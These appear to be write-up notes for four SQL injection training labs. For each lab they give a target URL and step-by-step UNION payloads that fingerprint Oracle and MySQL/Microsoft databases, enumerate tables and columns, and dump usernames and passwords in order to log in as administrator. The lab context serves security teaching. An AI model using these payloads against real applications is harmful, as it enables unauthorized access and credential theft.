# Examining the database

## SQL injection attack, querying the database type and version on Oracle

This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Target URL:

```
https://ac411f5e1efd6df0807300ed00e30057.web-security-academy.net/filter?category=Gifts
```

Solution:

```SQL
' ORDER BY 1,2--
' UNION SELECT 'a','b' FROM dual--
' UNION SELECT banner, NULL FROM v$version--
```

Modified URL:

```
https://ac411f5e1efd6df0807300ed00e30057.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+banner,+NULL+FROM+v$version--
```

## SQL injection attack, querying the database type and version on MySQL and Microsoft

This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

Target URL:

```
https://ac8b1f3e1ea6a87a804d17df00960002.web-security-academy.net/filter?category=Corporate+gifts
```

Solution:

```SQL
' ORDER BY 1,2--
' UNION SELECT 'a','b'-- banner
' UNION SELECT @@version, NULL-- banner
```

Modified URL:

```
https://ac8b1f3e1ea6a87a804d17df00960002.web-security-academy.net/filter?category=Corporate+gifts'+UNION+SELECT+@@version,+NULL--+banner
```

## SQL injection attack, listing the database contents on non-Oracle databases

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

Target URL:

```
https://ac641fb21ef453a780df0e850024008d.web-security-academy.net/filter?category=Gifts
```

Solution:

```SQL
' ORDER BY 1,2--
' UNION SELECT table_name, table_schema FROM information_schema.tables--
' UNION SELECT table_name, column_name FROM information_schema.columns--
' UNION SELECT username_oqfoht, password_bhyjfz FROM users_bjmkrc--
```

Modified URL:

```
https://ac641fb21ef453a780df0e850024008d.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+username_oqfoht,+password_bhyjfz+FROM+users_bjmkrc--
```

## SQL injection attack, listing the database contents on Oracle

This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.

To solve the lab, log in as the `administrator` user.

Target URL:

```
https://acbd1f041f52bf1b802b011b007d00b2.web-security-academy.net/filter?category=Gifts
```

Solution:

```SQL
' ORDER BY 1,2--
' UNION SELECT table_name, NULL FROM all_tables--
' UNION SELECT table_name, column_name FROM all_tab_columns WHERE table_name = 'USERS_VMNLRN'--
' UNION SELECT USERNAME_TXJCMV, PASSWORD_PQWHDR FROM USERS_VMNLRN--
```

Modified URL:

```
https://acbd1f041f52bf1b802b011b007d00b2.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+USERNAME_TXJCMV,+PASSWORD_PQWHDR+FROM+USERS_VMNLRN--
```